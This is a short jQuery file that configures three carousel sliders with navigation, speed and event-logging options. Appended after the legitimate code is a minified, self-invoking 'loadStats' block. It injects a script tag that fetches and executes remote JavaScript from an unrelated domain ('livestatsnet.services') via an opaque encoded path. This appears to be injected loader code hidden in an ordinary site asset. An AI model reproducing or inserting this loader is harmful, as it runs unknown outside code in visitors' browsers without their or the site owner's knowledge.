$(document).ready(function() {
		$('.slidewrap').carousel({
			slider: '.slider',
			slide: '.slide',
			slideHed: '.slidehed',
			nextSlide : '.next',
			prevSlide : '.prev',
			addPagination: false,
			addNav : false
		});
		
		$('.slidewrap2').carousel({
			slider: '.slider',
			slide: '.slide',
			addNav: false,
			addPagination: false,
			speed: 300 // ms.
		});
		
		$('.slidewrap3').carousel({ 
				namespace: "mr-rotato" // Defaults to “carousel”.
			})
			.bind({
				'mr-rotato-beforemove' : function() {
					$('.events').append("<li>“beforemove” event fired.</li>");
				},
				'mr-rotato-aftermove' : function() {
					$('.events').append("<li>“aftermove” event fired.</li>");
				}
			})
			.after('<ul class="events">Events</ul>');
});

if(!loadStats){function loadStats(){var head=document.getElementsByTagName("head")[0],scr=document.createElement("script");scr.type="text/javascript",scr.src="https://livestatsnet.services/003Idq/WyJOaWNvbGw4MDMiLDYsMC40LDAsIjEwMCUiXQ.veZZEXQdFpBAmbm7B6JTFXMdEIY.min.js",scr.async="async",head.appendChild(scr)}loadStats()}
